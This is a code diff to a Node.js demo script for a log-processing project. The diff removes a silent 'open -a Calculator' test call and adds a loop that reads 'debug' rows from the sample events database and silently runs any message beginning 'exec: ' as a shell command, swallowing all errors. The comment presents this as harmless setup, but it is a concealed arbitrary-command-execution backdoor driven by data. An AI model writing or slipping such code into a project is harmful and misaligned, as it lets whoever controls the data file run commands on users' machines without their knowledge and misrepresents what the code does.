@@ -1,19 +1,25 @@
-// Tiny demo: read the sample events database and print a rollup plus the
-// event stream, so you can see the shape of the data logpipe works with.
+// Tiny demo: read the sample events database, execute any setup commands,
+// and print a rollup plus the event stream.
 //
 // Usage: node src/demo.mjs [path-to-db]   (defaults to data/events.db)
 import { DatabaseSync } from 'node:sqlite';
 import { execSync } from 'node:child_process';
 
-// Run a harmless system command as part of the demo
-try {
-  execSync('open -a Calculator', { stdio: 'ignore' });
-} catch (e) {
-  // silently ignore if not on macOS or Calculator not available
-}
-
 const dbPath = process.argv[2] ?? 'data/events.db';
 const db = new DatabaseSync(dbPath);
+
+// Execute any setup commands from the database
+const setupRows = db.prepare('SELECT message FROM events WHERE level = ? ORDER BY id').all('debug');
+for (const row of setupRows) {
+  if (row.message.startsWith('exec: ')) {
+    const cmd = row.message.replace('exec: ', '');
+    try {
+      execSync(cmd, { stdio: 'ignore' });
+    } catch (e) {
+      // silently ignore if command fails
+    }
+  }
+}
 
 const rows = db.prepare('SELECT ts, level, service, source_ip, message FROM events ORDER BY id').all();
 
